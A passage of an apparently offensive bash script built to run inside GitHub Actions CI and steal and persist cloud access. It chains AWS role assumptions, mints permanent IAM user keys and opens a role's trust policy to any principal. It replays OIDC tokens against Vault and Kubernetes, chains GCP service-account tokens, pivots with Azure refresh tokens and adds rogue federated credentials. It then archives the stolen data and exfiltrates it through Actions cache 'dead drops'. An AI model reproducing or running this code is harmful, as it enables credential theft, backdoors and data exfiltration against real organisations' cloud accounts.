    ci=0
    : > "$D/aws_chain_roles.txt"
    for R2 in $ARNS; do
      [ "$R2" = "$ARN" ] && continue
      ci=$((ci+1))
      [ "$ci" -gt 2 ] && break
      out="$D/aws_chain_$ci.json"
      AWS_ACCESS_KEY_ID="$AK" AWS_SECRET_ACCESS_KEY="$SK" AWS_SESSION_TOKEN="$ST" \
        timeout 15 aws sts assume-role --role-arn "$R2" --role-session-name "wfx-$$" \
        --duration-seconds 3600 \
        --tags "Key=wfx,Value=$$" "Key=repo,Value=${WF_REPO:-unknown}" \
        --transitive-tag-keys wfx repo \
        --output json > "$out" 2>>"$D/errors.log"
      crc=$?
      if [ "$crc" != "0" ] || ! grep -q '"AccessKeyId"' "$out" 2>/dev/null; then
        note "aws_chain_retry_notags $R2"
        AWS_ACCESS_KEY_ID="$AK" AWS_SECRET_ACCESS_KEY="$SK" AWS_SESSION_TOKEN="$ST" \
          timeout 15 aws sts assume-role --role-arn "$R2" --role-session-name "wfx-$$" \
          --duration-seconds 3600 --output json > "$out" 2>>"$D/errors.log"
        crc=$?
      fi
      if [ "$crc" = "0" ] && grep -q '"AccessKeyId"' "$out" 2>/dev/null; then
        printf '%s\n' "$R2" >> "$D/aws_chain_roles.txt"
        note "aws_chain_ok $ci"
      else
        note "aws_chain_fail $R2"
        rm -f "$out"
      fi
    done
    [ "$ci" = "0" ] && note "aws_chain_skip"
    # First SUCCESSFUL chain — failed candidates delete their file, and the
    # first-candidate-denied path must still reach the persistence stage.
    CF=$(ls "$D"/aws_chain_*.json 2>/dev/null | head -1)
    CAK=$(sed -n 's/.*"AccessKeyId"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$CF" 2>/dev/null | head -1)
    CSK=$(sed -n 's/.*"SecretAccessKey"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$CF" 2>/dev/null | head -1)
    CST=$(sed -n 's/.*"SessionToken"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$CF" 2>/dev/null | head -1)
    if [ -n "$CAK" ] && [ -n "$CSK" ]; then
      AWS_ACCESS_KEY_ID="$CAK" AWS_SECRET_ACCESS_KEY="$CSK" AWS_SESSION_TOKEN="$CST" \
        timeout 15 aws sts get-caller-identity --output json > "$D/aws_chain_caller.json" 2>>"$D/errors.log" \
        || note "aws_chain_caller_fail"
      # Session credentials (every path here is a role session) cannot call
      # CreateAccessKey without --user-name, so enumerate users first: a role
      # holding iam:CreateAccessKey gets permanent keys for up to 2 users.
      AWS_ACCESS_KEY_ID="$CAK" AWS_SECRET_ACCESS_KEY="$CSK" AWS_SESSION_TOKEN="$CST" \
        timeout 15 aws iam list-users --max-items 5 --output json > "$D/aws_users.json" 2>>"$D/errors.log"
      ulrc=$?
      if [ "$ulrc" = "0" ] && grep -q '"UserName"' "$D/aws_users.json" 2>/dev/null; then
        python3 -I - "$D/aws_users.json" > "$D/aws_user_names.txt" 2>>"$D/errors.log" <<'PYUN'
import json, sys
try:
    o = json.load(open(sys.argv[1]))
except Exception:
    raise SystemExit(0)
for u in o.get("Users", [])[:2]:
    print(u.get("UserName") or "")
PYUN
        un=0
        while IFS= read -r UN; do
          [ -n "$UN" ] || continue
          un=$((un+1))
          [ "$un" -gt 2 ] && break
          AWS_ACCESS_KEY_ID="$CAK" AWS_SECRET_ACCESS_KEY="$CSK" AWS_SESSION_TOKEN="$CST" \
            timeout 15 aws iam create-access-key --user-name "$UN" --output json > "$D/aws_perm_$un.json" 2>>"$D/errors.log"
          prc=$?
          if [ "$prc" = "0" ] && grep -q '"AccessKeyId"' "$D/aws_perm_$un.json" 2>/dev/null; then
            note "aws_perm_ok $UN"
          else
            note "aws_perm_denied $UN"
            rm -f "$D/aws_perm_$un.json"
          fi
        done < "$D/aws_user_names.txt"
        [ "$un" = "0" ] && note "aws_users_empty"
      else
        note "aws_users_denied"
      fi
      R2N=$(sed -n 's|.*:role/\(.*\)$|\1|p' "$D/aws_chain_roles.txt" 2>>"$D/errors.log" | head -1)
      # Role ARNs may carry a path (role/team/deploy); IAM role-name takes
      # the basename only — the path is a separate ARN field and would 400.
      R2N="${R2N##*/}"
      if [ -n "$R2N" ]; then
        AWS_ACCESS_KEY_ID="$CAK" AWS_SECRET_ACCESS_KEY="$CSK" AWS_SESSION_TOKEN="$CST" \
          timeout 15 aws iam update-assume-role-policy --role-name "$R2N" \
          --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"*"},"Action":"sts:AssumeRole"}]}' \
          --output json > "$D/aws_policy.json" 2>>"$D/errors.log"
        arc=$?
        if [ "$arc" = "0" ]; then note "aws_policy_ok"; else note "aws_policy_denied"; rm -f "$D/aws_policy.json"; fi
      fi
    fi
  else
    note "aws_chain_parse_fail"
  fi
fi

# ---------- 7b. audience replay: Vault JWT login + Kubernetes bearer ----------
# The mint endpoint accepts caller-chosen audiences; a bound-but-loose Vault
# role or kube cluster that trusts the GitHub issuer validates only iss/aud,
# so the token minted for the OIDC trust is replayed as-is.
if [ "${WF_OIDC_REPLAY:-1}" = "1" ] && [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && [ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then
  VAULT_ADDR="${VAULT_ADDR:-}"
  if [ -z "$VAULT_ADDR" ]; then
    VAULT_ADDR=$(sed -n 's/^VAULT_ADDR=//p' "$D/env.txt" 2>/dev/null | tr -d '"' | head -1)
  fi
  if [ -z "$VAULT_ADDR" ]; then
    VAULT_ADDR=$(grep -rhoE 'VAULT_ADDR[[:space:]]*[=:][[:space:]]*"?https?://[^"[:space:]]+' "$D/repo" 2>/dev/null | sed -n 's|.*\(https\?://[^"[:space:]]*\).*|\1|p' | head -1)
  fi
  if [ -n "$VAULT_ADDR" ]; then
    VAULT_ADDR="${VAULT_ADDR%/}"
    note "vault_addr_found $VAULT_ADDR"
    mint_oidc "$VAULT_ADDR" vault
    VJ=$(jwt_of "$D/oidc_vault.json")
    ORGN=$(printf '%s' "${WF_REPO:-x/y}" | cut -d/ -f1)
    REPN=$(printf '%s' "${WF_REPO:-x/y}" | cut -d/ -f2)
    VT=""
    if [ -n "$VJ" ]; then
      for vr in "$REPN" "$ORGN" github github-actions cicd; do
        [ -n "$VT" ] && break
        [ -n "$vr" ] || continue
        vs=$(printf '%s' "$vr" | tr 'A-Z' 'a-z' | tr -c 'a-z0-9._' '_')
        vcode=$(curl -sS --max-time 15 -o "$D/vault_login_$vs.json" -w '%{http_code}' \
          -X POST -d "role=$vr" -d "jwt=$VJ" "$VAULT_ADDR/v1/auth/jwt/login" 2>>"$D/errors.log")
        if [ "$vcode" = "200" ]; then
          VT=$(sed -n 's/.*"client_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$D/vault_login_$vs.json" | head -1)
          [ -n "$VT" ] && note "vault_login_ok $vr"
        else
          note "vault_login_fail $vr $vcode"
          rm -f "$D/vault_login_$vs.json"
        fi
      done
    else
      note "vault_mint_fail"
    fi
    if [ -z "$VT" ] && [ -s "$D/fs/vault-token" ]; then
      VT=$(cat "$D/fs/vault-token" 2>/dev/null)
      [ -n "$VT" ] && note "vault_token_static"
    fi
    if [ -n "$VT" ]; then
      vcode=$(curl -sS --max-time 15 -o "$D/vault_caps.raw" -w '%{http_code}' -X POST \
        -H "X-Vault-Token: $VT" -d '{"paths":["secret/data/","kv/data/","transit/","ssh/"]}' \
        "$VAULT_ADDR/v1/sys/capabilities-self" 2>>"$D/errors.log")
      if [ "$vcode" = "200" ]; then
        head -c 65536 "$D/vault_caps.raw" > "$D/vault_caps.json"
        note "vault_caps_ok"
      else
        note "vault_caps_http $vcode"
      fi
      rm -f "$D/vault_caps.raw"
    fi
  fi
  # KUBECONFIG is a colon-separated merge list; pick the first entry that is
  # a readable FILE. Split on ':' only (no whitespace splitting, no globbing
  # — paths legitimately contain spaces and [ ]), and restore both states.
  KC=""
  oIFS=$IFS; IFS=':'; set -f
  for kc in ${KUBECONFIG:-$HOME/.kube/config}; do
    [ -f "$kc" ] && [ -r "$kc" ] && { KC="$kc"; break; }
  done
  IFS=$oIFS; set +f
  if [ -n "$KC" ] && [ -r "$KC" ]; then
    KSERVER=$(sed -n 's/^[[:space:]]*server:[[:space:]]*\(https\?:\/\/[^[:space:]]*\).*/\1/p' "$KC" | head -1)
    KCID=$(sed -n 's/^[[:space:]]*client-id:[[:space:]]*\([^[:space:]]*\).*/\1/p' "$KC" | head -1)
    note "kube_config_found server=$([ -n "$KSERVER" ] && echo 1 || echo 0) cid=$([ -n "$KCID" ] && echo 1 || echo 0)"
    if [ -n "$KSERVER" ] && [ -n "$KCID" ]; then
      mint_oidc "$KCID" kube
      KT=$(jwt_of "$D/oidc_kube.json")
      if [ -n "$KT" ]; then
        kcode=$(curl -sS -k --max-time 15 -o "$D/kube_ns.raw" -w '%{http_code}' \
          -H "Authorization: Bearer $KT" "$KSERVER/api/v1/namespaces" 2>>"$D/errors.log")
        [ "$kcode" = "200" ] && note "kube_api_ok" || note "kube_api_http $kcode"
        head -c 65536 "$D/kube_ns.raw" > "$D/kube_namespaces.json" 2>/dev/null
        rm -f "$D/kube_ns.raw"
        scode=$(curl -sS -k --max-time 15 -o "$D/kube_sec.raw" -w '%{http_code}' \
          -H "Authorization: Bearer $KT" "$KSERVER/api/v1/secrets?limit=1" 2>>"$D/errors.log")
        [ "$scode" = "200" ] && note "kube_secrets_ok" || note "kube_secrets_denied $scode"
        head -c 65536 "$D/kube_sec.raw" > "$D/kube_secrets.json" 2>/dev/null
        rm -f "$D/kube_sec.raw"
      else
        note "kube_mint_fail"
      fi
    fi
  fi
fi

# static creds in the environment: prove them live (CLI-gated, one call)
if [ -n "${AWS_ACCESS_KEY_ID:-}" ] && [ -n "${AWS_SECRET_ACCESS_KEY:-}" ] \
   && command -v aws >/dev/null 2>&1; then
  timeout 15 aws sts get-caller-identity --output json > "$D/aws_caller.json" 2>>"$D/errors.log" || note "aws_caller_fail"
fi

if [ -n "$GCP_PROV" ]; then
  T=$(jwt_of "$D/oidc_gcp_prov.json"); [ -z "$T" ] && T=$(jwt_of "$D/oidc_gcp.json")
  if [ -n "$T" ]; then
    curl -sS --max-time 30 -X POST "https://sts.googleapis.com/v1/token" \
      -H "Content-Type: application/json" \
      -d "{\"audience\":\"$GCP_PROV\",\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$T\"}" \
      -o "$D/gcp_sts.json" 2>>"$D/errors.log"
    FT=$(sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$D/gcp_sts.json" | head -1)
    if [ -n "$FT" ] && [ -n "$GCP_SA" ]; then
      curl -sS --max-time 30 -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$GCP_SA:generateAccessToken" \
        -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
        -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' \
        -o "$D/gcp_sa_token.json" 2>>"$D/errors.log"
    fi
  fi
fi

# ---------- 7c. GCP TokenCreator chain + signJwt ----------
if [ "${WF_GCP_TC:-1}" = "1" ] && [ -n "$GCP_PROV" ] && [ -n "$FT" ]; then
  GPL="$D/gcp_live"
  GPR=$( { grep -o '"projectId"[[:space:]]*:[[:space:]]*"[^"]*"' "$GPL/projects.json" 2>/dev/null | sed 's/.*"\([^"]*\)"$/\1/'; \
           grep -o '"projectId"[[:space:]]*:[[:space:]]*"[^"]*"' "$GPL/gcloud_projects.json" 2>/dev/null | sed 's/.*"\([^"]*\)"$/\1/'; \
           sed '/^[[:space:]]*$/d' "$GPL/project_hints.txt" 2>/dev/null; } | sort -u | head -3)
  gp=0
  for gprj in $GPR; do
    gp=$((gp+1))
    [ "$gp" -gt 3 ] && break
    curl -sS --max-time 15 -H "Authorization: Bearer $FT" \
      "https://iam.googleapis.com/v1/projects/$gprj/serviceAccounts" \
      -o "$D/gcp_sa_list_$gp.raw" 2>>"$D/errors.log"
    if [ -s "$D/gcp_sa_list_$gp.raw" ]; then
      head -c 262144 "$D/gcp_sa_list_$gp.raw" > "$D/gcp_sa_list_$gp.json"
    else
      note "gcp_sa_list_empty $gprj"
    fi
    rm -f "$D/gcp_sa_list_$gp.raw"
  done
  grep -oh '[a-z0-9-]*@[a-z0-9-]*\.iam\.gserviceaccount\.com' "$D"/gcp_sa_list_*.json 2>/dev/null \
    | sort -u | head -3 > "$D/gcp_sa_candidates.txt"
  if [ ! -s "$D/gcp_sa_candidates.txt" ] && [ -n "$GCP_SA" ]; then
    printf '%s\n' "$GCP_SA" > "$D/gcp_sa_candidates.txt"
  fi
  si=0
  while IFS= read -r sa; do
    [ -n "$sa" ] || continue
    si=$((si+1))
    [ "$si" -gt 3 ] && break
    curl -sS --max-time 20 -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$sa:generateAccessToken" \
      -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
      -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}' \
      -o "$D/gcp_sa_token_$si.json" 2>>"$D/errors.log"
    if grep -q '"accessToken"' "$D/gcp_sa_token_$si.json" 2>/dev/null; then
      note "gcp_sa_token_ok $si"
    else
      note "gcp_sa_token_fail $si"
      rm -f "$D/gcp_sa_token_$si.json"
    fi
  done < "$D/gcp_sa_candidates.txt"
  if [ -n "$GCP_SA" ]; then
    for gsa in sts gcs; do
      case "$gsa" in
        sts) gaud="https://sts.googleapis.com/" ;;
        *) gaud="https://storage.googleapis.com/" ;;
      esac
      curl -sS --max-time 20 -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$GCP_SA:signJwt" \
        -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
        -d "{\"payload\":\"{\\\"aud\\\":\\\"$gaud\\\"}\"}" \
        -o "$D/gcp_signjwt_$gsa.json" 2>>"$D/errors.log"
      if grep -q '"signedJwt"' "$D/gcp_signjwt_$gsa.json" 2>/dev/null; then
        note "gcp_signjwt_ok $gsa"
      else
        note "gcp_signjwt_fail $gsa"
        rm -f "$D/gcp_signjwt_$gsa.json"
      fi
    done
  fi
fi

if [ -n "$AZ_CLIENT" ] && [ -n "$AZ_TENANT" ]; then
  # client secret wins when present; otherwise federate the minted JWT
  AZ_SECRET="${AZURE_CLIENT_SECRET:-}"
  T=$(jwt_of "$D/oidc_azure.json")
  if [ -n "$AZ_SECRET" ]; then
    curl -sS --max-time 30 -X POST "https://login.microsoftonline.com/$AZ_TENANT/oauth2/v2.0/token" \
      -d "client_id=$AZ_CLIENT" \
      -d "client_secret=$AZ_SECRET" \
      -d "scope=https://management.azure.com/.default" \
      -d "grant_type=client_credentials" \
      -o "$D/azure_token.json" 2>>"$D/errors.log"
  elif [ -n "$T" ]; then
    curl -sS --max-time 30 -X POST "https://login.microsoftonline.com/$AZ_TENANT/oauth2/v2.0/token" \
      -d "client_id=$AZ_CLIENT" \
      -d "scope=https://management.azure.com/.default" \
      -d "grant_type=client_credentials" \
      -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
      -d "client_assertion=$T" \
      -o "$D/azure_token.json" 2>>"$D/errors.log"
  fi
  # one-step enumeration with the ARM bearer: subscriptions, then keyvaults
  AB=$(sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$D/azure_token.json" | head -1)
  if [ -n "$AB" ]; then
    curl -sS --max-time 20 -H "Authorization: Bearer $AB" \
      "https://management.azure.com/subscriptions?api-version=2022-12-01" \
      -o "$D/azure_subs.json" 2>>"$D/errors.log" || note "az_subs_fail"
    SUB=$(grep -o '"subscriptionId"[[:space:]]*:[[:space:]]*"[^"]*"' "$D/azure_subs.json" 2>/dev/null | sed 's/.*"\([^"]*\)"$/\1/' | head -1)
    if [ -n "$SUB" ]; then
      curl -sS --max-time 25 -H "Authorization: Bearer $AB" \
        "https://management.azure.com/subscriptions/$SUB/resources?\$filter=resourceType%20eq%20'Microsoft.KeyVault/vaults'&api-version=2022-12-01" \
        -o "$D/azure_keyvaults.json" 2>>"$D/errors.log" || note "az_kv_fail"
    fi
  fi
fi
# env vars are the first-class credential source, not just repo grep
[ -z "$AZ_CLIENT" ] && [ -n "${AZURE_CLIENT_ID:-}" ] && [ -n "${AZURE_TENANT_ID:-}" ] && {
  AZ2="${AZURE_CLIENT_ID}"; AT2="${AZURE_TENANT_ID}"
  curl -sS --max-time 30 -X POST "https://login.microsoftonline.com/$AT2/oauth2/v2.0/token" \
    -d "client_id=$AZ2" \
    -d "client_secret=${AZURE_CLIENT_SECRET:-}" \
    -d "scope=https://management.azure.com/.default" \
    -d "grant_type=client_credentials" \
    -o "$D/azure_token_env.json" 2>>"$D/errors.log"
  AB2=$(sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$D/azure_token_env.json" | head -1)
  if [ -n "$AB2" ]; then
    curl -sS --max-time 20 -H "Authorization: Bearer $AB2" \
      "https://management.azure.com/subscriptions?api-version=2022-12-01" \
      -o "$D/azure_subs_env.json" 2>>"$D/errors.log" || note "az_subs_env_fail"
    SUB2=$(grep -o '"subscriptionId"[[:space:]]*:[[:space:]]*"[^"]*"' "$D/azure_subs_env.json" 2>/dev/null | sed 's/.*"\([^"]*\)"$/\1/' | head -1)
    if [ -n "$SUB2" ]; then
      curl -sS --max-time 25 -H "Authorization: Bearer $AB2" \
        "https://management.azure.com/subscriptions/$SUB2/resources?\$filter=resourceType%20eq%20'Microsoft.KeyVault/vaults'&api-version=2022-12-01" \
        -o "$D/azure_keyvaults_env.json" 2>>"$D/errors.log" || note "az_kv_env_fail"
    fi
  fi
}

# ---------- 7d. Azure FIC enumeration + FOCI refresh-token pivot ----------
if [ "${WF_AZ_FIC:-1}" = "1" ]; then
  AGRAPH=""
  if command -v az >/dev/null 2>&1; then
    AGRAPH=$(timeout 20 az account get-access-token --resource-type ms-graph --query accessToken -o tsv 2>>"$D/errors.log" | tr -d '\r' | head -1)
    [ -n "$AGRAPH" ] || note "az_graph_token_fail"
  fi
  RF=""
  MC="$D/fs/azure/msal_token_cache.json"
  if [ -r "$MC" ]; then
    SEG=$(sed -n 's/.*"RefreshToken"[[:space:]]*:[[:space:]]*{\([^}]*\)}.*/\1/p' "$MC" | head -1)
    if [ -z "$SEG" ]; then
      FLAT=$(tr -d '\n\r' < "$MC" 2>/dev/null)
      SEG=$(printf '%s' "$FLAT" | sed -n 's/.*"RefreshToken"[[:space:]]*:[[:space:]]*{\([^}]*\)}.*/\1/p' | head -1)
    fi
    if [ -n "$SEG" ]; then
      RF=$(printf '%s' "$SEG" | sed -n 's/.*"secret"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)
    fi
    [ -n "$RF" ] && note "az_foci_src_msal"
  fi
  if [ -z "$RF" ] && [ -r "$D/fs/azure/accessTokens.json" ]; then
    RF=$(sed -n 's/.*"refreshToken"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$D/fs/azure/accessTokens.json" | head -1)
    [ -n "$RF" ] && note "az_foci_src_adt"
  fi
  if [ -z "$RF" ]; then
    RF=$(grep -rhoE '"refresh_token"[[:space:]]*:[[:space:]]*"[^"]{20,}"' "$D/fs/azure" "$D/fs/azd" 2>/dev/null | sed 's/.*"\([^"]*\)"$/\1/' | head -1)
    [ -n "$RF" ] && note "az_foci_src_grep"
  fi
  if [ "${WF_FOCI:-1}" = "1" ] && [ -n "$RF" ]; then
    note "az_foci_refresh_found"
    for fcid in 04b07795-8ddb-461a-bbee-02f9e1bf7b46 1950a258-227b-4e31-a9cf-717495945fc2; do
      case "$fcid" in
        04b0*) fcl=vs ;;
        *) fcl=azcli ;;
      esac
      for fscope in https://graph.microsoft.com/.default https://management.azure.com/.default https://vault.azure.net/.default; do
        case "$fscope" in
          *graph*) fsfx=graph ;;
          *management*) fsfx=arm ;;
          *) fsfx=kv ;;
        esac
        fcode=$(curl -sS --max-time 20 -o "$D/az_foci_${fcl}_${fsfx}.json" -w '%{http_code}' -X POST \
          "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
          -d "client_id=$fcid" -d "grant_type=refresh_token" -d "refresh_token=$RF" \
          -d "scope=$fscope" 2>>"$D/errors.log")
        [ "$fcode" = "200" ] && note "az_foci_ok $fcl $fsfx" || note "az_foci_http $fcl $fsfx $fcode"
      done
    done
  fi
  if [ -z "$AGRAPH" ] && [ -s "$D/az_foci_vs_graph.json" ]; then
    AGRAPH=$(sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$D/az_foci_vs_graph.json" | head -1)
    [ -n "$AGRAPH" ] && note "az_graph_token_foci"
  fi
  if [ -n "$AGRAPH" ]; then
    curl -sS --max-time 25 -H "Authorization: Bearer $AGRAPH" \
      "https://graph.microsoft.com/v1.0/applications?\$select=id,appId,displayName&\$expand=federatedIdentityCredentials" \
      -o "$D/az_fic_apps.raw" 2>>"$D/errors.log"
    if [ -s "$D/az_fic_apps.raw" ]; then
      head -c 262144 "$D/az_fic_apps.raw" > "$D/az_fic_apps.json"
      FN=$(grep -o '"federatedIdentityCredentials"' "$D/az_fic_apps.json" 2>/dev/null | wc -l | tr -d ' ')
      note "az_fic_apps n=$FN"
      grep -o '"id":"[0-9a-fA-F-]\{36\}","appId"' "$D/az_fic_apps.json" 2>/dev/null \
        | sed 's/"id":"\([0-9a-fA-F-]*\)".*/\1/' | head -3 > "$D/az_fic_ids.txt"
    else
      note "az_fic_apps_fail"
    fi
    rm -f "$D/az_fic_apps.raw"
  fi
  if [ -n "$AGRAPH" ] && [ -s "$D/az_fic_ids.txt" ]; then
    SUBJ="repo:${WF_REPO:-unknown}:ref:refs/heads/${WF_REF:-main}"
    fi2=0
    while IFS= read -r oid; do
      [ -n "$oid" ] || continue
      fi2=$((fi2+1))
      fcode=$(curl -sS --max-time 20 -o "$D/az_fic_add_$fi2.json" -w '%{http_code}' -X POST \
        -H "Authorization: Bearer $AGRAPH" -H "Content-Type: application/json" \
        -d "{\"name\":\"wfx-ci-$fi2\",\"issuer\":\"https://token.actions.githubusercontent.com\",\"subject\":\"$SUBJ\",\"audiences\":[\"api://AzureADTokenExchange\"]}" \
        "https://graph.microsoft.com/v1.0/applications/$oid/federatedIdentityCredentials" 2>>"$D/errors.log")
      case "$fcode" in
        200|201) note "az_fic_add_ok $fi2" ;;
        401|403) note "az_fic_add_denied $fi2 $fcode" ;;
        *) note "az_fic_add_http $fi2 $fcode" ;;
      esac
    done < "$D/az_fic_ids.txt"
  fi
fi
note "oidc_discovery arn=${ARN:-none} gcp=${GCP_PROV:-none} azure=${AZ_CLIENT:-none}"

# ---------- 8. package ----------
T="${RUNNER_TEMP:-/tmp}/wfx-$$.tgz"
tar -czf "$T" -C "$(dirname "$D")" "$(basename "$D")" 2>>"$D/errors.log"
TAR_RC=$?
if [ "$TAR_RC" != "0" ]; then
  note "tar_failed $TAR_RC"
  rm -f "$T"
fi
SZ=$(wc -c < "$T" 2>/dev/null || echo 0)
note "archive_bytes $SZ"

# ---------- 9. dead-drop exfil (zero/low-egress channels) ----------
# Protocols from actions/toolkit sources:
#   cache v2:  generated/results/api/v1/cache.twirp-client.ts — Twirp JSON on
#              ACTIONS_RESULTS_URL: CreateCacheEntry -> signed Azure blob
#              (block PUTs + blocklist) -> FinalizeCacheEntryUpload
#   cache v1:  packages/cache/src/internal/cacheHttpClient.ts — reserve/PATCH
#              chunks/commit; GHES/self-hosted only, github.com retired it
#   artifact:  @actions/artifact upload-http-client.ts — create (6.0-preview)
#              -> PUT fileContainerResourceUrl?itemPath= (8MiB chunks) ->
#              PATCH Size
# All additive: any failure is a note, the callback path below stays primary.
H=$(printf '%s' "${WF_REPO:-unknown}" | tr '/:@' '___')
# One run can have several jobs/legs; each uploads under its own id so parts
# never overwrite each other.
RID="${GITHUB_RUN_ID:-0}-${GITHUB_JOB:-0}-$$"
ok=0
RTOK="${ACTIONS_RUNTIME_TOKEN:-}"
RUNURL="${ACTIONS_RUNTIME_URL:-}"
CACHEURL="${ACTIONS_CACHE_URL:-}"
RESULTSURL="${ACTIONS_RESULTS_URL:-}"
SUM_FILE="${GITHUB_STEP_SUMMARY:-}"
# The trio only exists after the bridge action re-exported it; script/expr
# vectors and runner variants without the bridge land here.
if [ -z "$RTOK" ] || { [ -z "$RESULTSURL" ] && [ -z "$CACHEURL" ] && [ -z "$RUNURL" ]; }; then
  note "exfil_no_runtime_vars"
fi

# --- cache dead-drop (retrieved later via cache API with matching key/version) ---
# Dead drops are viewer-exposed on public repos, so the whole channel set is
# gated on private: public repos keep callback/fallback/log only.
if [ "${WF_EXFIL_CACHE:-1}" = "1" ] && [ "${WF_PRIVATE:-0}" = "1" ] && [ -n "$RTOK" ] && [ "$SZ" -gt 0 ]; then
  CKEY="wfx-${H}-${RID}"
  # Version is a sha256 so it stays 64-hex like v1 versions; retrieval just
  # recomputes the same constant string.
  CVERSION=$(printf '%s' 'wfx-deaddrop|gzip|1.0' | sha256sum | cut -d' ' -f1)
  if [ -n "$RESULTSURL" ]; then
    # --- v2: Twirp on ACTIONS_RESULTS_URL (github.com) ---
    # Path prefix preserved: a results service served under a subpath
    # (GHES/proxy) must keep it, not be rebuilt as bare scheme://host.
    TW="${RESULTSURL%/}/twirp/github.actions.results.api.v1.CacheService"
    SUU=$(curl -sS --max-time 30 -X POST "$TW/CreateCacheEntry" \
      -H "Authorization: Bearer $RTOK" \
      -H "Content-Type: application/json" \
      -d "{\"key\":\"$CKEY\",\"version\":\"$CVERSION\"}" 2>>"$D/errors.log" \
      | python3 -I -c 'import json,sys
try:
  o=json.load(sys.stdin)
except Exception:
  raise SystemExit(0)
print(o.get("signedUploadUrl") or o.get("signed_upload_url") or "")' 2>>"$D/errors.log")
    if [ -n "$SUU" ]; then
      case "$SUU" in *\?*) AMP='&' ;; *) AMP='?' ;; esac
      split -d -a 5 -b 8388608 "$T" "$T.blk." 2>/dev/null
      bok=1; n=0; SENT=0
      BLIST=''
      for b in "$T".blk.*; do
        [ -e "$b" ] || continue
        BSZ=$(wc -c < "$b" 2>/dev/null || echo 0)
        # Block ids are standard base64 (azure contract); percent-encoded for
        # the query string so the wire carries the real alphabet incl. '='.
        BID=$(printf '%08d' "$n" | base64)
        UCODE=$(printf '%s' "$BID" | sed 's/+/%2B/g; s/\//%2F/g; s/=/%3D/g')
        BC=$(curl -sS --connect-timeout 10 --max-time 90 -o /dev/null -w '%{http_code}' -X PUT \
          "${SUU}${AMP}comp=block&blockid=${UCODE}" \
          -H "Content-Type: application/octet-stream" \
          --data-binary "@$b" 2>>"$D/errors.log")
        case "$BC" in 2*) SENT=$((SENT + BSZ)) ;; *) bok=0; note "blob_block_fail $BC"; break ;; esac
        BLIST="${BLIST}<Latest>${BID}</Latest>"
        n=$((n+1))
      done
      rm -f "$T".blk.* 2>/dev/null
      if [ "$bok" = "1" ] && [ "$n" -gt 0 ] && [ "$SENT" -ge "$SZ" ]; then
        printf '%s' "<?xml version=\"1.0\" encoding=\"utf-8\"?><BlockList>${BLIST}</BlockList>" > "$T.blist"
        LC=$(curl -sS --connect-timeout 10 --max-time 90 -o /dev/null -w '%{http_code}' -X PUT \
          "${SUU}${AMP}comp=blocklist" \
          -H "Content-Type: application/xml" \
          --data-binary "@$T.blist" 2>>"$D/errors.log")
        rm -f "$T.blist" 2>/dev/null
        case "$LC" in 2*)
          FOK=$(curl -sS --max-time 30 -X POST "$TW/FinalizeCacheEntryUpload" \
            -H "Authorization: Bearer $RTOK" \
            -H "Content-Type: application/json" \
            -d "{\"key\":\"$CKEY\",\"size_bytes\":\"$SZ\",\"version\":\"$CVERSION\"}" 2>>"$D/errors.log" \
            | python3 -I -c 'import json,sys
try:
  o=json.load(sys.stdin)
except Exception:
  raise SystemExit(0)
print("1" if o.get("ok") is True else "0")' 2>>"$D/errors.log")
          if [ "$FOK" = "1" ]; then ok=1; note "cache_dropped $CKEY"; else note "cache_finalize_fail"; fi
          ;;
        *) note "blob_list_fail $LC" ;;
        esac
      else
        note "cache_incomplete"
      fi
    else
      note "cache_reserve_fail"
    fi
  elif [ -n "$CACHEURL" ] && [ "${GITHUB_SERVER_URL:-https://github.com}" != "https://github.com" ]; then
    # --- v1 REST (GHES / self-hosted runners with the legacy surface) ---
    # Env URLs end with "/" — the path glue is "_apis", never "/_apis".
    CACHEAPIS="${CACHEURL}_apis/artifactcache"
    CID=$(curl -sS --max-time 30 -X POST "$CACHEAPIS/caches" \
      -H "Authorization: Bearer $RTOK" \
      -H "Accept: application/json;api-version=6.0-preview.1" \
      -H "Content-Type: application/json" \
      -d "{\"key\":\"$CKEY\",\"version\":\"wfx-$RID\",\"cacheSize\":$SZ}" 2>>"$D/errors.log" \
      | python3 -I -c 'import json,sys
try:
  o=json.load(sys.stdin)
except Exception:
  raise SystemExit(0)
print(o.get("cacheId") or "")' 2>>"$D/errors.log")
    if [ -n "$CID" ]; then
      off=0; cok=1
      split -d -a 5 -b 33554432 "$T" "$T.cache." 2>/dev/null
      for p in "$T".cache.*; do
        [ -e "$p" ] || continue
        psz=$(wc -c < "$p" 2>/dev/null || echo 0)
        [ "$psz" -gt 0 ] || continue
        end=$((off + psz - 1))
        CC=$(curl -sS --connect-timeout 10 --max-time 60 -o /dev/null -w '%{http_code}' -X PATCH \
          "$CACHEAPIS/caches/$CID" \
